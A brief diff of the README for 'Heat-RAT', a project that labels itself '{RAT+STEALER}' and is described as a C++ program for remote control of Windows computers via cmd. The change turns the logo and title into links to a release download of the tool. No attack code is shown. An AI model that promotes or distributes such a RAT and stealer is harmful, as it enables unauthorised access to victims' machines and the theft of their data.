@@ -1,6 +1,6 @@
 <a id ="up"></a>
-![logo](files_for_GitHub/LOGO.png)
-{RAT+STEALER}
+[![logo](files_for_GitHub/LOGO.png)](https://github.com/Nick-Vinesmoke/Heat-RAT/releases/tag/HeatRAT_v1.4.0)
+[{RAT+STEALER}](https://github.com/Nick-Vinesmoke/Heat-RAT/releases/tag/HeatRAT_v1.4.0)
 ---
 🔭Program for remote control of windows computers via cmd. Written in C++
 
